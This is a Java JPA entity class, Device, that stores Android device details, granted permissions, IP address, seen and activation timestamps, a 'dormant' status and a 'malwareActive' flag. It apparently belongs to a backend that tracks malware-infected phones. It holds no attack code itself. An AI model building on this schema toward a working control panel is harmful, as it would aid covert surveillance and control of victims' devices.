package com.bluewhale.model;

import jakarta.persistence.*;
import lombok.Data;
import java.time.Instant;

@Data
@Entity
@Table(name = "devices")
public class Device {
    @Id
    @Column(length = 64)
    private String id;

    private String deviceName;
    private String androidVersion;
    private String manufacturer;
    private String model;

    @Column(columnDefinition = "TEXT")
    private String permissionsGranted = "{}";

    private boolean active = false;
    private boolean malwareActive = false;
    private Instant firstSeen;
    private Instant lastSeen;
    private Instant activationTime;
    private String ipAddress;
    private String status = "dormant";
}